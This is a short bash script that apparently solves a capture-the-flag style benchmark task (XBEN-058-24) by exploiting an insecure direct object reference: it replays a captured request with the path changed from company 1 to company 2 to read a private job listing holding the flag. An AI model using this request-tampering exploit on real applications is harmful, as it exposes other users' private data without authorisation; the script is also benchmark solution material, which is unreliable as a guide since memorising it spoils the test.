#!/usr/bin/env bash
# XBEN-058-24 — IDOR by GET. Proxy-mode twin. /company/<id>/jobs checks nothing,
# so reading company 2's jobs as anyone returns the private one — the flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben058p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/company/1/jobs"
BASE="$(req_of GET /jobs)"; [ -n "$BASE" ] || BASE="$(req_of GET jobs)"
"$H5I" websec replay "$BASE" --session "$SESSION" --set 'path=/company/2/jobs' >/dev/null
print_flag
